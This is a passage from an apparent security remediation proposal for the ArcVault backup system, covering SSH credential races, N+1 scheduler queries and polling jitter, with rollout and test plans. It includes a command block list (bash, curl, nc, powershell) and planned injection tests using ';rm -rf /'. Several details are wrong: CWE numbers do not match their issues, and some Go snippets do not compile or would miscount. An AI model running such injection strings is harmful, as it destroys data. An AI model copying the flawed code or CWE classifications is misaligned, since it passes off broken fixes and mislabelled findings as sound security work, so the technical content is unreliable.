    CleanupFuncs  []func()
}

func applySSHKeyCredentials(ctx *ExecutorContext, keyData string) error {
    // Create job-specific temp directory
    jobTempDir, err := os.MkdirTemp("", fmt.Sprintf("arcvault-job-%s-*", ctx.JobID))
    if err != nil {
        return fmt.Errorf("failed to create job temp directory: %w", err)
    }
    
    // Write SSH key to job directory
    keyPath := filepath.Join(jobTempDir, "key.pem")
    if err := os.WriteFile(keyPath, []byte(keyData), 0600); err != nil {
        os.RemoveAll(jobTempDir)
        return fmt.Errorf("failed to write SSH key: %w", err)
    }
    
    // Store in context (not global env var)
    ctx.TempKeyPath = keyPath
    ctx.TempKeyDir = jobTempDir
    
    // Cleanup removes entire job directory
    ctx.CleanupFuncs = append(ctx.CleanupFuncs, func() {
        os.RemoveAll(jobTempDir)
    })
    
    return nil
}

// When executing rsync, pass key path as explicit argument:
func runRsync(ctx *ExecutorContext, job Job, report ProgressFunc) (int, string) {
    args := []string{"-a", "--info=progress2"}
    
    // If SSH key is needed, add explicit SSH command with key path
    if ctx.TempKeyPath != "" {
        args = append(args, "-e", fmt.Sprintf("ssh -i %s", ctx.TempKeyPath))
    }
    
    args = append(args, job.SourcePath, job.DestPath)
    
    cmd := exec.Command("rsync", args...)
    return streamRsync(cmd, report)
}
```

**Option B: Pass Credentials via stdin (Strongest)**
```go
// For password-based auth, pass password to ssh via stdin instead of env var:

func applySSHPasswordCredentials(password string) (*exec.Cmd, func(), error) {
    // Create pipe for password
    pr, pw := io.Pipe()
    
    // Write password to pipe (other end connected to sshpass stdin)
    go func() {
        io.WriteString(pw, password)
        pw.Close()
    }()
    
    // Return pipe reader + cleanup func
    cleanup := func() {
        pr.Close()
    }
    
    return pr, cleanup, nil
}

// Usage with sshpass:
pr, cleanup, _ := applySSHPasswordCredentials(password)
defer cleanup()

cmd := exec.Command("sshpass", "-d", "3", "rsync", "-e", "ssh", src, dst)
cmd.ExtraFiles = []*os.File{pr}  // Pass pipe as fd 3
cmd.Run()
```

**Option C: Use ssh-agent (Best for Key Management)**
```go
// Start ssh-agent per job, add key, use agent socket

func setupSSHAgent(keyData string) (string, func(), error) {
    // Start ssh-agent for this job only
    cmd := exec.Command("ssh-agent", "-s")
    output, err := cmd.Output()
    if err != nil {
        return "", nil, fmt.Errorf("ssh-agent failed: %w", err)
    }
    
    // Parse SSH_AUTH_SOCK and SSH_AGENT_PID from output
    // Write key data to temp file
    keyFile, err := os.CreateTemp("", "ssh-key-*.pem")
    if err != nil {
        return "", nil, err
    }
    keyFile.WriteString(keyData)
    keyFile.Close()
    os.Chmod(keyFile.Name(), 0600)
    
    // Add key to agent
    cmd = exec.Command("ssh-add", keyFile.Name())
    if err := cmd.Run(); err != nil {
        os.Remove(keyFile.Name())
        return "", nil, fmt.Errorf("ssh-add failed: %w", err)
    }
    
    cleanup := func() {
        os.Remove(keyFile.Name())
        // Kill ssh-agent
    }
    
    return agentSocket, cleanup, nil
}
```

**Implementation Steps (Priority: HIGH):**
1. Create `ExecutorContext` struct to hold per-job state
2. Refactor credential setup to use context instead of global env vars
3. Update RealExecutor to pass credentials via explicit command-line args (not env vars)
4. Update tests to verify concurrent job execution doesn't interfere:
   ```go
   Test_ConcurrentJobsWithDifferentSSHKeys()
   // Run 2 jobs in parallel with different SSH keys
   // Verify each job uses its own key (not mixed)
   ```
5. Add integration test:
   ```go
   Test_SSHKeyFileCleanedUpAfterJobCompletes()
   Test_SSHKeyFileNotAccessibleToOtherJobs()
   ```
6. Audit code for other global state races (SSHPASS env var has same issue!)

**Risk Assessment:**
- **Implementation risk:** Medium (requires refactoring credential handling)
- **Deployment risk:** Low (doesn't affect API, only internal job execution)
- **Testing:** Must test concurrent job execution thoroughly
- **Performance:** Slight overhead (per-job cleanup), negligible

---

### **P0-007: Scheduler Database Queries Risk N+1 and Blocking** [HIGH]

**CWE-1025:** Comparison Using Wrong Factors  
**CVSS v3.1 Score:** 6.5 (Medium)  
**Attack Vector:** Network / Low Complexity / Availability  

#### Root Cause
```go
// coordinator/server/scheduler.go (line 68-130)
func (s *Server) checkMissedSchedules() {
    // Query 1: Get all scheduled jobs
    rows, err := s.db.Conn().Query(`
        SELECT id, name, agent_id, schedule FROM jobs
        WHERE schedule IS NOT NULL AND schedule != ''
    `)
    if err != nil {
        return
    }
    defer rows.Close()
    
    for rows.Next() {
        var jobID, jobName, agentID, schedule string
        rows.Scan(&jobID, &jobName, &agentID, &schedule)
        
        // Query 2: Get alert rules for THIS job (N+1 query!)
        rules, err := s.db.GetAlertRulesForJob(jobID)  // ← NEW QUERY PER JOB
        if err != nil {
            continue
        }
        
        for _, rule := range rules {
            // Query 3: Get last run for THIS job (another N+1!)
            var lastRun *time.Time
            s.db.Conn().QueryRow(`
                SELECT MAX(finished_at) FROM job_runs WHERE job_id = ?
            `, jobID).Scan(&lastRun)  // ← NEW QUERY PER JOB PER RULE
            
            // Query 4: Check if alert already fired recently
            var recentAlertCount int64
            s.db.Conn().QueryRow(`
                SELECT COUNT(*) FROM alert_history
                WHERE job_id = ? AND rule_type = 'missed_schedule'
                AND fired_at > datetime('now', '-' || ? || ' seconds')
            `, jobID, rule.Threshold).Scan(&recentAlertCount)  // ← ANOTHER QUERY
        }
    }
}
```

**Problem:**
1. **N+1 Query Pattern:**
   - 1 initial query: All jobs (M jobs returned)
   - M queries: GetAlertRulesForJob (1 per job)
   - M×K queries: Job run timestamps (M jobs × K rules per job)
   - M×K queries: Alert history checks (another M×K queries!)
   - **Total: 1 + M + M×K + M×K = O(M×K) queries**
   - Example: 500 jobs × 3 rules = ~3000 queries instead of 1-2 joins

2. **Blocking Scheduler:** Runs in single goroutine; blocks all other operations while scanning
   - Every database query is sequential
   - If database slow (1ms/query), 3000 queries = 3+ seconds
   - During this time, UI queries, agent polls are queued behind scheduler

3. **No Indexing Hints:** Queries use full table scans instead of indexed lookups:
   ```sql
   SELECT id, name, agent_id, schedule FROM jobs
   WHERE schedule IS NOT NULL AND schedule != ''
   -- Index needed on (schedule) for efficient filtering
   
   SELECT MAX(finished_at) FROM job_runs WHERE job_id = ?
   -- Index needed on (job_id, finished_at) for MAX lookup
   ```

4. **Synchronous Scheduler Runs:** Called every minute from cron; blocks coordinator
   - No timeout; if query hangs, scheduler hangs
   - No connection pool management; could exhaust database connections

#### Impact
- **Coordinator Lag:** Admin UI becomes unresponsive during scheduler runs
- **Missed Alerts:** If scheduler slower than check interval, alerts fall behind
- **Database Exhaustion:** Thousands of queries spike CPU, memory, connection pool
- **Agent Disconnection:** Agent polls blocked, appear offline
- **Cascading Failure:** If scheduler hangs, coordinator becomes unavailable

#### Real-World Scenario
1. ArcVault deployed with 1000 jobs, each with 5 alert rules
2. checkMissedSchedules() runs every minute
3. Query count: 1 + 1000 + 5000 + 5000 = 11,001 queries
4. Database (SQLite with single connection) processes sequentially: 11+ seconds
5. Next scheduler tick starts while previous one still running
6. Scheduler queue builds up; database connection exhausted
7. Agent polls start timing out
8. Coordinator UI unresponsive to admin
9. Alerts delayed or never fire

#### Remediation

**Option A: Single Batch Query (Recommended)**
```go
// Rewrite to use single JOIN query, not N+1
func (s *Server) checkMissedSchedules() {
    // Single query: jobs + their alert rules + last run + recent alerts
    rows, err := s.db.Conn().Query(`
        SELECT 
            j.id, j.name, j.agent_id, j.schedule,
            ar.id, ar.rule_type, ar.threshold,
            MAX(jr.finished_at) as last_run,
            COUNT(ah.id) as recent_alert_count
        FROM jobs j
        LEFT JOIN alert_rules ar ON j.id = ar.job_id AND ar.enabled = 1
        LEFT JOIN job_runs jr ON j.id = jr.job_id
        LEFT JOIN alert_history ah ON j.id = ah.job_id 
            AND ah.rule_type = 'missed_schedule'
            AND ah.fired_at > datetime('now', '-' || ar.threshold || ' seconds')
        WHERE j.schedule IS NOT NULL AND j.schedule != ''
        GROUP BY j.id, ar.id
    `)
    if err != nil {
        log.Printf("Scheduler: checkMissedSchedules query failed: %v", err)
        return
    }
    defer rows.Close()
    
    // Process results (single pass)
    for rows.Next() {
        var jobID, jobName, agentID, schedule string
        var ruleID, ruleType string
        var threshold int
        var lastRun *time.Time
        var recentAlertCount int64
        
        if err := rows.Scan(&jobID, &jobName, &agentID, &schedule, 
                            &ruleID, &ruleType, &threshold,
                            &lastRun, &recentAlertCount); err != nil {
            continue
        }
        
        // Check if alert should fire (all data already loaded)
        if recentAlertCount == 0 && (lastRun == nil || 
            time.Since(*lastRun).Seconds() > float64(threshold)) {
            s.Notifier.Dispatch(...)
        }
    }
}
```

**Option B: Async Scheduler (Non-Blocking)**
```go
// Run scheduler in separate goroutine with timeout
func (s *Server) StartScheduler() {
    c := cron.New()
    
    // Schedule checkMissedSchedules to run async, with timeout
    _, err := c.AddFunc("0 * * * *", func() {  // Every hour instead of every minute
        ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
        defer cancel()
        
        // Run in goroutine, don't block scheduler
        go func() {
            s.checkMissedScheduleWithContext(ctx)
        }()
    })
}

func (s *Server) checkMissedScheduleWithContext(ctx context.Context) {
    // Batch query with context
    rows, err := s.db.Conn().QueryContext(ctx, `...`)
    // ... process ...
}
```

**Option C: Add Database Indexes**
```go
// In database schema initialization
CREATE INDEX IF NOT EXISTS idx_jobs_schedule ON jobs(schedule) WHERE schedule IS NOT NULL;
CREATE INDEX IF NOT EXISTS idx_alert_rules_job_id ON alert_rules(job_id, enabled);
CREATE INDEX IF NOT EXISTS idx_job_runs_job_finished ON job_runs(job_id, finished_at DESC);
CREATE INDEX IF NOT EXISTS idx_alert_history_job_rule ON alert_history(job_id, rule_type, fired_at DESC);
```

**Implementation Steps:**
1. Add database indexes (Option C) immediately (low-risk, high-impact)
2. Refactor checkMissedSchedules to use single batch query (Option A)
3. Add query timeout (Option B)
4. Add monitoring:
   ```go
   // Log scheduler performance
   start := time.Now()
   s.checkMissedSchedules()
   duration := time.Since(start)
   log.Printf("Scheduler: checkMissedSchedules took %.2f seconds", duration.Seconds())
   if duration > 5*time.Second {
       log.Printf("WARNING: checkMissedSchedules slow, may impact coordinator")
   }
   ```
5. Add integration test:
   ```go
   Test_CheckMissedSchedules_EfficiencyWith1000Jobs()
   // Benchmark: should complete in < 1 second
   ```

**Risk Assessment:**
- **Implementation risk:** Low (refactoring; same business logic)
- **Deployment risk:** Low (internal change, no API change)
- **Testing:** Requires load testing with realistic job counts
- **Performance benefit:** 100-1000x reduction in queries

---

### **P0-008: Agent Polling Uses Fixed Interval Without Jitter** [MEDIUM]

**CWE-674:** Uncontrolled Recursion  
**CVSS v3.1 Score:** 5.3 (Medium)  
**Attack Vector:** Network / Low Complexity / Availability  

#### Root Cause
```go
// agent/main.go (line ~100)
Config: runner.Config{
    PollInterval: 30 * time.Second,  // ← Fixed 30s interval
}

// agent/runner/runner.go (line ~50)
func (r *Runner) Start() error {
    ticker := time.NewTicker(r.cfg.PollInterval)  // ← Fixed interval
    defer ticker.Stop()
    
    for {
        select {
        case <-ticker.C:
            // Poll coordinator for new jobs
            jobs, err := r.poll()
            ...
        }
    }
}
```

**Problem:**
1. **Thundering Herd:** All N agents on same 30-second boundary:
   - T=0s: All 100 agents poll simultaneously
   - Coordinator receives 100 concurrent requests
   - Database/network spike
   - T=30s: Another synchronized spike

2. **Predictable Load:** Operator can predict exact moment of spike:
   ```
   Agent poll load
   ^
   | █                    █                    █
   | █                    █                    █
   | █ █                  █ █                  █ █
   +────────────────────────────────────────────────────-> time
     0s      15s       30s      45s       60s
   ```

3. **Denial of Service:** Attacker with control of one agent can:
   - Set PollInterval to very short (1s)
   - Coordinate with compromised agents to all poll at same time
   - Exhaust coordinator resources

4. **Network Saturation:** Synchronized polling causes predictable bandwidth spikes
   - Interferes with real backup traffic
   - May trigger rate limiters if present

#### Impact
- **Resource Spikes:** Coordinator CPU/database spike every 30 seconds
- **Coordinator Lag:** During spike, other requests delayed
- **Predictable DoS Vector:** Attacker can time attacks to coincide with spike
- **Scalability Ceiling:** Can't scale to thousands of agents without coordinator overload

#### Real-World Scenario
1. ArcVault deployment: 500 agents, all with PollInterval=30s
2. At T=0s (each agent's startup), all poll simultaneously
3. Coordinator handles 500 concurrent /api/jobs requests
4. Database locks up; all 500 clients wait
5. After 5+ seconds, spike completes
6. Coordinator catches up, processes requests
7. T=30s: Spike repeats
8. UI becomes intermittently unresponsive during spikes

#### Remediation

**Option A: Add Jitter (Recommended)**
```go
// agent/runner/runner.go

import "math/rand"

func (r *Runner) Start() error {
    // Calculate interval with jitter: base ± 20%
    baseInterval := r.cfg.PollInterval
    jitterRange := baseInterval / 5  // ±20%
    jitteredInterval := baseInterval + time.Duration(rand.Int63n(int64(2*jitterRange)) - int64(jitterRange))
    
    // Randomize initial delay to spread startup polls
    initialDelay := time.Duration(rand.Int63n(int64(baseInterval)))
    time.Sleep(initialDelay)
    
    ticker := time.NewTicker(jitteredInterval)
    defer ticker.Stop()
    
    for {
        select {
        case <-ticker.C:
            jobs, err := r.poll()
            ...
        }
    }
}

// Result: polls now distributed across time window
// Agent 1 polls at T=0s
// Agent 2 polls at T=8s
// Agent 3 polls at T=15s
// ... natural distribution, no synchronized spike
```

**Option B: Exponential Backoff on Success**
```go
// Only poll at full rate if coordinator is busy
// If getting quick response, increase backoff

const (
    MinPollInterval = 10 * time.Second
    MaxPollInterval = 5 * time.Minute
)

func (r *Runner) Start() error {
    currentInterval := time.Duration(r.cfg.PollInterval)
    
    for {
        start := time.Now()
        jobs, err := r.poll()
        duration := time.Since(start)
        
        // If poll took < 100ms, coordinator is responsive → can reduce frequency
        if err == nil && duration < 100*time.Millisecond && currentInterval < MaxPollInterval {
            currentInterval = time.Duration(float64(currentInterval) * 1.5)
        } else if err != nil && currentInterval > MinPollInterval {
            // If poll failed, increase frequency to retry faster
            currentInterval = time.Duration(float64(currentInterval) * 0.7)
        }
        
        // Add jitter
        jitter := time.Duration(rand.Int63n(int64(currentInterval / 4)))
        time.Sleep(currentInterval - jitter)
    }
}
```

**Option C: Event-Driven (Ideal)**
```go
// Remove fixed polling; use push notifications from coordinator

// coordinator/server/hub.go
func (h *Hub) BroadcastJobsForAgent(agentID string, jobs []Job) {
    // Send update to specific agent's WebSocket
    // Agent knows about new jobs immediately
}

// agent/ws/ws.go
func (c *Client) handleJobsUpdate(msg NewJobsNotification) {
    // Process jobs immediately when coordinator pushes update
    // No need to poll
}
```

**Implementation Steps:**
1. Add jitter to PollInterval calculation (Option A) - LOW RISK, IMMEDIATE
2. Add randomized initial delay on agent startup
3. Log actual poll intervals to verify distribution:
   ```go
   log.Printf("Agent polling at interval: %v (jitter applied)", jitteredInterval)
   ```
4. Add integration test:
   ```go
   Test_PollingIntervalHasJitter()
   // Run 10 agents, verify poll times are NOT synchronized
   Test_InitialDelayScattersPolls()
   // Verify all agents don't poll at T=0s
   ```
5. Update config to make jitter configurable:
   ```json
   {
       "poll_interval_seconds": 30,
       "poll_jitter_percent": 20
   }
   ```
6. Monitor coordinator load to verify spike reduction

**Risk Assessment:**
- **Implementation risk:** Very low (simple randomization)
- **Deployment risk:** None (agent-side only, transparent to coordinator)
- **Testing:** Easy to verify with multiple agent instances
- **Benefit:** Immediate reduction in load spikes

---

## Implementation Order & Dependencies

### Phase 1: Authentication & Authorization Hardening (Week 1)
**Priority: CRITICAL — Fix foundation issues first**

| Vuln | Task | Dependencies | Effort | Risk |
|------|------|--------------|--------|------|
| P0-001 | CORS wildcard validation | None | 2 days | Low |
| P0-002 | WebSocket origin check | P0-001 | 2 days | Low |
| P0-004 | Admin token env vars | None | 3 days | Med |
| **Subtotal** | | | **~1 week** | |

**Deployment Strategy:**
- Deploy P0-001 + P0-004 simultaneously (independent)
- Deploy P0-002 after P0-001 verified
- Rollback plan: Revert config to plaintext tokens if env var loading fails

**Validation:**
- Unit tests for CORS, WebSocket, credential loading
- Integration test: broker-less test with multiple origins
- Manual test: Browser + curl verify CORS/WebSocket behavior

---

### Phase 2: Command Execution Hardening (Week 2)
**Priority: CRITICAL — Execution tier security**

| Vuln | Task | Dependencies | Effort | Risk |
|------|------|--------------|--------|------|
| P0-003 | Command validation + whitelist | None | 4 days | Med |
| **Subtotal** | | | **~1 week** | |

**Deployment Strategy:**
- Deploy command validation in "audit mode" first (log violations, don't block)
- Audit existing templates for violations
- Enable enforcement after 1 sprint

**Validation:**
- Test each whitelisted program: rsync, robocopy
- Negative tests: reject bash, curl, nc, powershell
- Template audit: query all existing commands, report violations

---

### Phase 3: Operational Hardening (Week 3)
**Priority: HIGH — Stability & correctness**

| Vuln | Task | Dependencies | Effort | Risk |
|------|------|--------------|--------|------|
| P0-005 | DB scan error logging | None | 1 day | Low |
| P0-006 | SSH credential race fix | None | 3 days | Med |
| P0-007 | Scheduler query optimization | None | 2 days | Low |
| P0-008 | Agent polling jitter | None | 1 day | Low |
| **Subtotal** | | | **~1 week** | |

**Deployment Strategy:**
- Phase 3a: P0-005, P0-007, P0-008 (low-risk, immediate deployment)
- Phase 3b: P0-006 (requires testing with concurrent jobs)

---

### Critical Path Summary
```
Week 1: Auth/Authz (P0-001, P0-002, P0-004)
  ↓
Week 2: Execution (P0-003 audit mode)
  ↓
Week 3: Operational (P0-005, P0-006, P0-007, P0-008)
  ↓
Week 4: Integrated Testing + Documentation
  ↓
Release
```

**Total Estimated Effort:** 3-4 weeks (2 engineers, 1 QA)

---

## Risk Assessment & Mitigation

### Deployment Risks by Vulnerability

| Vuln | Risk | Mitigation |
|------|------|-----------|
| P0-001 | Config update breaks dashboards | Whitelist dashboard origin before rollout |
| P0-002 | WebSocket origin check rejects clients | Client origin header testing in staging |
| P0-003 | Template whitelist breaks existing jobs | Audit mode first, approve violations before enforcement |
| P0-004 | Env var not set → coordinator won't start | Clear startup error message, deployment docs |
| P0-005 | Error logging adds verbosity | Rate-limit error logs to prevent spam |
| P0-006 | Test concurrent jobs thoroughly | Run 100x concurrent job integration test |
| P0-007 | Query plan changes impact performance | Benchmark before/after, monitor in staging |
| P0-008 | Jitter may slightly increase latency | Jitter range tunable, can be disabled if needed |

### Rollback Plan
Each phase has rollback steps:
- **Phase 1:** Revert config.json format, restore hardcoded tokens (low risk)
- **Phase 2:** Disable command validation enforcement, allow audit-only mode (safe)
- **Phase 3:** Individual vulnerability fixes are independent; each rollbackable separately

---

## Testing Strategy

### Unit Testing
- CORS middleware: valid/invalid origins
- WebSocket CheckOrigin: allowed/denied origins
- Command validation: whitelist/blacklist programs
- Config loading: env var override, fallback to file
- DB error handling: log + return errors
- SSH credentials: per-job isolation
- Scheduler queries: single query vs N+1
- Polling jitter: distribution verification

### Integration Testing
- Multi-agent concurrent polls (timing distribution)
- Concurrent jobs with different credentials
- Scheduler runs with 1000+ jobs
- WebSocket connection from different origins
- CORS preflight requests
- Template execution with various commands
- Admin token lifecycle (creation, rotation, expiration)

### Security Testing
- MITM test: WebSocket from attacker.com should be rejected
- Credential leakage: verify no keys left in /tmp after job
- Race condition: run 100 concurrent jobs with different SSH keys, verify no mixing
- Injection: try to execute "bash", "curl", ";rm -rf /" in templates

### Load Testing
- 500+ agents polling simultaneously (verify jitter reduces peak)
- 1000+ jobs with scheduler running (verify query optimization)
- Concurrent API requests during scheduler spike

---

## Metrics & Monitoring

**Post-remediation, monitor:**
1. **CORS/WebSocket Rejections:** Should be ~0 for legitimate clients, > 0 for attacker probes
2. **Command Validation Failures:** Should be 0 if templates are clean
3. **DB Scan Errors:** Should be 0 in normal operation
4. **Scheduler Runtime:** Should be < 1s (vs. 3-5s currently if N+1 queries exist)
5. **Coordinator Request Latency:** Should show elimination of 30-second spikes
6. **SSH Key Cleanup:** Temp directory should be empty after each job (no orphaned keys)

---

## Documentation Updates Required

1. **Deployment Guide:**
   - Set ARCVAULT_ADMIN_TOKEN and ARCVAULT_JWT_SECRET from env
   - Configure AllowedOrigins for your dashboard URL
   - Disable wildcard CORS in production

2. **Security Policy:**
   - No hardcoded credentials in config files
   - All sensitive data via environment variables or secret store
   - Command whitelist enforcement for templates
   - Agent polling jitter enabled by default

3. **Troubleshooting:**
   - "X-Partial-Results header present" → database integrity issue
   - Scheduler slow → check query performance, verify indexes
   - WebSocket rejected → verify origin in AllowedOrigins

---

## Sign-Off & Next Steps

**This proposal is ready for Elena Vasquez's review and team discussion.**

### Approval Required
- [ ] Elena Vasquez (Code Review Lead) - Technical feasibility, test strategy
- [ ] Kren Castro (Project Owner) - Timeline, release impact
- [ ] Operations (if deployed team exists) - Deployment procedures, rollback plan

### Next Phase
Upon approval, initiate **Phase 1** (Auth/Authz hardening) in next sprint.

---

**Prepared by:** Kwame Asante, Cybersecurity Engineer  
**Review Date:** [Pending]  
**Status:** AWAITING APPROVAL FOR PHASE 1
